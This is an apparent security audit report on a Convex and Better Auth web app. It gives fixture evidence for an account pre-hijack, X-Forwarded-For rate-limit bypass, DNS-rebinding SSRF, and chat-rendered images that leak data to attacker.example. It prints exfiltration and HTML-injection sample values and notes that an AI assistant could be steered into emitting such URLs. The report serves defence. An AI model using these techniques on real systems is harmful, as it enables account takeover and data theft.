# Needs-validation leads — results (2026-09-24)

Follow-up to `NEEDS-VALIDATION.md`, settling the leads the audit could not
decide offline because `node_modules` was missing. Checked on `main` at
`7b6d446` by reading the installed libraries and running local fixtures.

- No traffic went to any Convex deployment or third party. The only socket
  opened was a loopback HTTP server in fixture 7. Fixture 6 stubbed `fetch`,
  and nothing called it.
- The fixtures were throwaway and are not committed. Their outputs are quoted
  below.
- Better Auth fixtures ran on `memoryAdapter`, with the options copied from
  `convex/auth.ts`:
  - `baseURL`, `trustedOrigins` and the `rateLimit` block with its
    `customRules`;
  - `cookies`, `session`, `emailAndPassword`, `emailVerification` and
    `accountLinking`;
  - `magicLink({ disableSignUp: true })`.
- The send callbacks only recorded what they were given.

Installed versions: better-auth 1.6.30 (@better-auth/core 1.6.30),
@convex-dev/better-auth 0.12.2, @convex-dev/resend 0.2.8 (svix 1.99.1 →
standardwebhooks 1.0.0), @convex-dev/rate-limiter 0.3.2, @convex-dev/agent
0.6.3, streamdown 2.5.0, convex 1.46.0, convex-test 0.0.58, Node 22.22.2.

## Summary

| # | Lead | Verdict |
|---|---|---|
| 1 | `unverified-credential-account-merge` (pre-hijack) | **Confirmed** through the verify-email link. Refuted for magic link and Google |
| 2 | `cta-url-unescaped` | **Refuted** for URLs Better Auth builds. The template is still unescaped (defence in depth) |
| 3 | `client-forwarded-for-rate-limit-key` | **Still blocked** on how Convex ingress handles `X-Forwarded-For`. The library side and proxy side are both confirmed |
| 4 | `recordView` limiter keys | **Confirmed** as described, low. Fixed by the audit PR for `recordView` (`fix/audit-0922-abuse`) |
| 5 | `streamdown-default-allowlists` | **Confirmed** as an outbound-GET sink. Exploitation depends on the model emitting the URL |
| 6 | `component-owned-copies-survive-erasure` | **Confirmed** for both the Resend and the Agent components |
| 7 | `dns-check-then-fetch-reresolves` | **Confirmed** that the check and the connect resolve separately. Exploitability **still blocked** on the runtime resolver's caching |
| 8 | Blocked unit `/resend-webhook` | **Refuted**. It fails closed, accepts only a closed union of event types, and enforces a ±5 min timestamp window |

---

## 1. Pre-hijack through an unverified password account — CONFIRMED (verify-email path only)

**Magic link: safe.** In `better-auth/dist/plugins/magic-link/index.mjs:169-172`,
verifying a link for a user with `!user.emailVerified` first calls
`revokeUnprovenAccountAccess` (`dist/db/revoke-unproven-account-access.mjs:15-21`).
That deletes every `credential` account and every session on the user.

**Google / OAuth: safe.** In `dist/oauth2/link-account.mjs:22-23`,
`requireLocalEmailVerified` defaults to `true`, so an unverified local user
gets "account not linked".

**Verify-email: vulnerable.** In `dist/api/routes/email-verification.mjs:292-314`:

- the handler calls `updateUserByEmail(…, { emailVerified: true })`, then
  `createSession` (`autoSignInAfterVerification` is on);
- it never calls `revokeUnprovenAccountAccess`, so the attacker's password
  survives.

The attacker can also make that email go out again: an anonymous POST to
`/send-verification-email` re-sends it to any unverified user (lines 96-113).
BA's limit of 3 per 60 s and the app's `verificationSend` bucket are the only
bound. `sendOnSignIn` is not set.

```
[A] MAGIC LINK: sign-up 200 | emailVerified=false | accounts=['credential'] ; attacker sign-in before: 403 EMAIL_NOT_VERIFIED
    verify 302 -> /app, session cookie set | same user id: true | emailVerified=true | accounts now=[]
    attacker sign-in after: 401 INVALID_EMAIL_OR_PASSWORD
[B] VERIFY-EMAIL: anonymous /send-verification-email 200 | verify mails to victim = 2
    verify 302 | session cookie set for clicker: true | same user id: true | emailVerified=true | accounts now=['credential']
    attacker sign-in after: { status: 200, user: '2Bun4…' }   <-- takeover
[C] GOOGLE (handleOAuthUserInfo, verified google identity): {"error":"account not linked"} | emailVerified=false | attacker sign-in: 403
```

**What this proves:**

- The victim has to click a "Verify your email" link for an account they never
  created.
- Once they do, they are signed into the BA user the attacker created, and the
  attacker's password still works.
- Anything the victim then does lands on that shared identity: `users` row
  provisioning, accepting invitations. This part is inferred from the source;
  the Convex-side binding was not exercised.

`KNOWN_ISSUES.md` § "Account linking & verified email" is right about OAuth and
magic link, but it does not cover this path.

**Recommended fix (not implemented here):**

- On `/verify-email`, do what `revokeUnprovenAccountAccess` does: delete the
  credential account and its sessions when the account was created by an
  unproven sign-up.
- Or turn `autoSignInAfterVerification` off and require a password reset or
  magic link after verifying.
- Also reword the verification email so it says an account with a password was
  created.

## 2. Unescaped CTA URL in email templates — REFUTED for BA-built URLs

**Relative values are rejected.** They are checked against
`dist/auth/trusted-origins.mjs:14-16`, whose regex rejects `"`, `<` and `>`
(HTTP 403 `INVALID_REDIRECT_URL`).

**Absolute same-origin values are neutralised.** They pass the origin check
(line 25), but the value is percent-encoded before it reaches `data.url`:

- `api/routes/password.mjs:80-81`
- `sign-up.mjs:244`
- `email-verification.mjs:29`
- `update-user.mjs:318,475,492,506`
- `plugins/magic-link/index.mjs:88-91`

Fixture output, rendering the real `convex/emailTemplates.ts`:

```
/request-password-reset redirectTo rel: HTTP 403 INVALID_REDIRECT_URL
/request-password-reset redirectTo abs: 200 -> …?callbackURL=https%3A%2F%2Fapp.example.test%2F%22%3E%3Ca%20href%3D%22https%3A%2F%2Fevil.example… | raw " < > : false | <a count = 1, evil anchor = false
/send-verification-email rel: 403 ; abs: 200, raw chars false, <a count = 1
/sign-in/magic-link rel: 403 ; abs callbackURL / errorCallbackURL / newUserCallbackURL: 200, raw chars false, <a count = 1
control (raw url straight into template): <a count = 3 | evil anchor = true
```

The control shows the template itself would inject if it were ever handed a raw
URL. Escaping `cta.url` and the `urlFallback` URL remains worthwhile as defence
in depth.

**Side finding: two dead rate-limit keys.**

- The `customRules` keys `/forgot-password` and `/email-verification/send` in
  `convex/auth.ts` match no BA 1.6.30 endpoint. The real endpoints are
  `/request-password-reset` and `/send-verification-email`.
- Those endpoints still get BA's built-in 3 per 60 s rule
  (`api/rate-limiter/index.mjs:378-382`), so this is dead config, not an open
  door.

## 3. Client-supplied X-Forwarded-For as the rate-limit key — STILL BLOCKED

**How Better Auth picks the client IP** (`@better-auth/core/dist/utils/ip.mjs`):

- The default header list is `["x-forwarded-for"]` (line 194), split on commas
  (line 173).
- With no `trustedProxies`, only a header holding a single valid IP is used
  (lines 188-191).
- Otherwise the IP is `null`, and in production that means one bucket shared by
  every client: `"no-trusted-ip"|path` (`api/rate-limiter/index.mjs:281-287`).
- `convex/auth.ts` sets no `advanced.ipAddress`.

**The proxy passes the header through unchanged.**
`@convex-dev/better-auth/dist/react-start/index.js:38` copies every inbound
header, and `src/routes/api/auth/$.ts` keeps them:

```
upstream request: { url: 'https://fake-123.convex.site/api/auth/sign-in/email', xff: '198.51.100.77', xri: '198.51.100.78' }
```

Twelve wrong-password sign-ins (sign-in rule: 5 per 60 s):

```
[a] no XFF:                   401×5 then 429×7 | key no-trusted-ip|/sign-in/email
[b] constant single XFF:      401×5 then 429×7 | key 203.0.113.9|/sign-in/email
[c] varied single XFF:        401×12, never 429 | 12 keys
[d] "x, 10.0.0.1" (appended): 401×5 then 429×7 | key no-trusted-ip  (one shared global bucket)
[e] non-IP junk:              shared no-trusted-ip bucket
```

**Still blocked on:** what `X-Forwarded-For` Better Auth actually receives in
production. Vercel's edge normally overwrites it, but an attacker can also POST
straight to the public `<deployment>.convex.site/api/auth/*`. What Convex's
ingress does with a client-supplied header decides the outcome:

- **Passes it through:** case [c], and brute-force limits are bypassed.
- **Appends to it:** case [d], one shared bucket, which enables a global
  lockout.
- **Overwrites it:** safe.

**Recommended regardless of that outcome:**

- Set `advanced.ipAddress` explicitly: either `ipAddressHeaders` naming a
  header the platform sets, or `trustedProxies`.
- Add a per-account limit on `/sign-in/email`, not only a per-IP one.

## 4. `shares.recordView` limiter keys — CONFIRMED (low), fixed by the `recordView` audit PR

`@convex-dev/rate-limiter` 0.3.2:

- `lib.js:6-22` inserts a `rateLimits` row `{name, key, shard, value, ts}` the
  first time it sees a key.
- `schema.js:4-10` stores the key raw.
- There is no TTL and no cron. The only deletion paths are `resetRateLimit` and
  `clearAll` (`lib.js:73-104`).

convex-test fixture:

```
[4a] 32 x recordView(bogus) -> null … null, rate_limited, rate_limited
[4b] rows after 21 distinct keys: 21 | largest stored key length: 200000
[4b] rows after advancing 90 days: 21
```

convex-test does not enforce production document or argument size limits, so
the real per-row ceiling is not established.

Branch `fix/audit-0922-abuse` resolves the token before `consumeLimit` and keys
the bucket on the resolved share id, so unresolved tokens write nothing.

## 5. Streamdown default allowlists — CONFIRMED as an outbound-GET sink

**What Streamdown does by default.** In streamdown 2.5.0
(`dist/chunk-BO2N2NFS.js`), the default rehype plugins are:

- `harden` with `allowedImagePrefixes: ["*"]`, `allowedLinkPrefixes: ["*"]`,
  `allowedProtocols: ["*"]` and `allowDataImages: true`;
- `rehype-raw`;
- `rehype-sanitize(defaultSchema + tel)`.

**Where that meets the app.**

- `MessageResponse` (`src/components/ai-elements/message.tsx:324-333`) passes
  none of these options, so the defaults apply.
- The CSP allows `img-src 'self' data: https:` (`src/lib/security-headers.ts:40`).

`renderToStaticMarkup(<MessageResponse>{md}</MessageResponse>)`, with
irrelevant markup trimmed:

```
<link rel="preload" as="image" href="https://attacker.example/p.png?leak=secret"/>
<img alt="x" … src="https://attacker.example/p.png?leak=secret"/>
<span title="Blocked URL: undefined">a [blocked]</span>        (javascript:)
<span title="Blocked URL: undefined">b [blocked]</span>        (data:text/html)
<button … data-streamdown="link" type="button">c</button>     (https link → linkSafety modal on click)
<img … src="https://attacker.example/raw.png?leak=secret2"/>  (raw HTML <img> survives)
<span>[Image blocked: d]</span>                               (data: image)
```

**What this proves:**

- A foreign https image, in markdown or in raw HTML, is fetched as soon as the
  message renders.
- `javascript:` and `data:` links are blocked.
- An https link needs a click and a confirmation.

It does not prove that the model can be steered into emitting such a URL with
data in it, for example through candidate transcript text reaching the
assistant via `readReport`.

**Recommended fix:** restrict harden's `allowedImagePrefixes` to self/none with
`allowDataImages: false` on `MessageResponse`, or render `img` as a link or
placeholder.

## 6. Component-owned copies survive erasure — CONFIRMED

**Resend component** (`@convex-dev/resend` 0.2.8):

- **What it keeps:** the `emails` table keeps `to`, `subject`, `from` and
  `resendId` (`schema.js:24-54`). The body is stored in `content`
  (`lib.js:148-164`) and deleted only by `cleanupEmail` (`lib.js:848-863`).
- **Cleanup exists but never runs:**
  - `cleanupOldEmails` (7-day default, `lib.js:20,70-92`) and
    `cleanupAbandonedEmails` (30-day default, `lib.js:22,866-889`) are not
    scheduled by the component itself. The component README makes this the
    app's responsibility.
  - `convex/crons.ts` schedules only `retention.purgeDueSessions`.
- **What is exposed:** the candidate invitation body (`convex/sessions.ts:203-217`)
  carries the candidate's name, the job title, the organisation name and the
  `/s/{accessToken}` link.

**Agent component** (`@convex-dev/agent` 0.6.3):

- The erasure paths never touch `components.agent` or `components.resend`:
  `purge.deleteChildRows` (`convex/purge.ts:101-147`) and `users.cascadeDelete`.
- The only deletion of agent data is the user-initiated `chat.deleteThread`.
- `readReportInternal` writes the candidate's name, summary, strengths,
  concerns and rationales into thread messages.

convex-test fixture, with the component as root and `fetch` stubbed:

```
[6] after delivered event: {"content":2,"emails":1,"finalizedAt":true,"htmlStored":"<p>Hi Alex Candidate</p><a href=\"https://app.example.test/s/SECRET_ACCESS_TOKEN\">Start</a>","status":"delivered","to":["delivered@resend.dev"]}
[6] after advancing 365 days, all scheduled functions drained: (identical — still stored)
[6] after explicit lib.cleanupOldEmails (never scheduled by the app): {"content":0,"emails":0,…}
[6] agent messages stored: [{"text":"Alex Candidate scored 42; concern: …","threadId":"…","userId":"org1:user1"}]
```

**What survives erasure:** personal data, not a live credential. The
invitation's `/s/` token stops working once the session row is gone.

**Recommended fix:**

- **Resend:** add a cron calling `components.resend.lib.cleanupOldEmails` and
  `cleanupAbandonedEmails`, or delete the component's email by its provider id
  inside `deleteChildRows`.
- **Agent:** add a retention cron over threads, or track which threads read
  which session and delete those on erasure.

## 7. DNS check, then a second resolution at fetch — CONFIRMED separate resolutions; exploitability STILL BLOCKED

`convex/jobImportFetch.ts:115-121` checks the host with
`node:dns/promises.lookup`, then calls `fetch(current, …)` with the hostname
URL and no dispatcher.

The fixture ran the real action through convex-test:

- the check resolver was stubbed to answer `93.184.216.34`;
- `node:dns.lookup`, which undici's connect uses, was stubbed to answer
  `127.0.0.1`;
- a loopback HTTP server stood in for an internal service.

```
[7] check-resolver calls: [ 'rebind.example.com' ]
[7] fetch() received: [ 'URL:http://rebind.example.com:39635/job dispatcher=none' ]
[7] connect-resolver calls: [ 'rebind.example.com' ]
[7] fetchJobPage returned: "INTERNAL-ONLY-SECRET"
```

**Still unknown:**

- whether the Convex Node runtime's resolver returns different answers inside
  that window, since caching could close it;
- what is listening on loopback or link-local addresses there.

**Recommended fix:** pass an undici `Agent({ connect: { lookup } })` as the
`dispatcher` on every hop, whose `lookup` returns the addresses that passed the
check.

## 8. `/resend-webhook` (previously blocked unit) — REFUTED

**Missing secret: fails closed.** `@convex-dev/resend/dist/client/index.js:11-14`
defaults the secret to `process.env.RESEND_WEBHOOK_SECRET ?? ""`, and lines
167-170 throw "Webhook secret is not set" before anything is parsed. The caller
gets a 5xx rather than a 4xx.

**Replay window: ±5 minutes, no de-duplication.** svix 1.99.1 →
standardwebhooks 1.0.0 (`dist/index.js:7,89-101`) rejects timestamps more than
5 minutes old or ahead, and compares the signature with `timingSafeEqual`.
Message ids are not de-duplicated, so an exact replay within 5 minutes is
processed again. The effect is only a duplicate `deliveryEvents` row and an
idempotent status patch, and it requires capturing a signed request first.

**Event type: a closed union.** `handleEmailEvent` declares its argument as
`v.any()`, but its first step is `attemptToParse(vEmailEvent, …)`
(`component/lib.js:789-801`), where `vEmailEvent` is a union of eight literal
types (`shared.js:43-102`). Invalid events are dropped before
`convex/emailEvents.ts` sees them.

```
[8a] no RESEND_WEBHOOK_SECRET, unsigned: THROWS Error: Webhook secret is not set, handleEmailEvent calls +0
[8b] secret set, unsigned: THROWS WebhookVerificationError: Missing required headers, +0
[8c] valid signature: HTTP 201, +1
[8d] exact replay of [8c] (same svix-id): HTTP 201, +1
[8e] valid signature, timestamp 6 min old: THROWS Message timestamp too old, +0
[8f] valid signature, timestamp 4 min old: HTTP 201, +1
```

No fix is needed. De-duplicating on `svix-id` would be optional.

## Not settled here — owner-side checks

These need the dashboards or deployment settings and could not be decided from
code:

- **Resend:** the account's monthly and per-second quotas, and what happens when
  they are exceeded. Does a burst of sends delay or drop other organisations'
  invitations and magic links?
- **GitHub:** the branch protection on `main` against Renovate's automerge. Is a
  review required, and is the Renovate app in any bypass list?
- **Deployment variables:** the `DEPLOY_CONVEX` / `CONVEX_DEPLOY_KEY` setup on
  the hosting side (the Vercel projects, now that the Scalingo docs are
  retired). Which build holds a production deploy key?
- **Convex:** the memory ceiling of a Node action, and how the runtime behaves
  when an action exceeds it. This decides the "300 MiB uploads" lead in
  `NEEDS-VALIDATION.md`.
- **Lead 3:** what `X-Forwarded-For` a request to `<deployment>.convex.site`
  carries when the client sets one.
